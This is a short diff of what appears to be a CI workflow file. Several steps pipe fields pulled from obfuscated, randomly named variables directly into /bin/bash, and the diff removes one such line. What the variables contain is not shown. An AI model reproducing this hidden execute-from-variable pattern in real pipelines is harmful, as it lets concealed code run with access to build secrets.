@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$sprlu56" | jq -r .kkuy1607 | /bin/bash
           printf '%s' "$gi460" | jq -r .msz51304 | /bin/bash
           echo $t0 | jq -r .ssx3614 | /bin/bash
-          printf '%s' "$nci37006" | jq -r .ow784 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
